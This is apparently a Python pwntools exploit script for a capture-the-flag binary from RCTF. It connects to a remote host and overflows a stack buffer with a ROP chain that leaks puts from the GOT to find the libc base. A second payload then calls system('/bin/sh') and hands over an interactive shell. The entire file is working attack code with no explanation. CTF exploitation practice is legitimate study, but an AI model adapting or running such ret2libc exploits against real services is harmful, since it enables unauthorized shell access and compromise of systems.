# -*- coding: utf-8 -*-
from pwn import *

context(log_level='debug')
'''
用万能ppp拉开栈空间。

'''
p = remote("111.198.29.45", 59641)
#p = process("./7806c218f783498fb6863cdbd84368ac")
elf = ELF("./7806c218f783498fb6863cdbd84368ac")
libc = ELF("/home/ubuntu/libc-database/db/libc6_2.23-0ubuntu10_amd64.so")

#gdb.attach(p,"b * 0x4007c6")
p.recvuntil("Welcome to RCTF")

pop_rdi = 0x4008a3
pppp_ret = 0x40089c
main = 0x4007cd

payload = "a"*0x18 + p64(pppp_ret)+p64(pop_rdi)+p64(elf.got["puts"])+p64(elf.plt["puts"])+p64(main)
p.sendline(payload)
sleep(1)
recv = p.recvuntil("\x7f\x0a")
puts_addr = u64(recv[-7:-1]+"\x00\x00")
log.success(hex(puts_addr))
libc_base = puts_addr - libc.symbols["puts"]
log.success(hex(libc_base))
system = libc_base + libc.symbols["system"]
binsh = libc_base + libc.search("/bin/sh").next()
payload = "a"*0x18 + p64(pppp_ret)+p64(pop_rdi)+p64(binsh)+p64(system)
p.sendline(payload)

p.interactive()

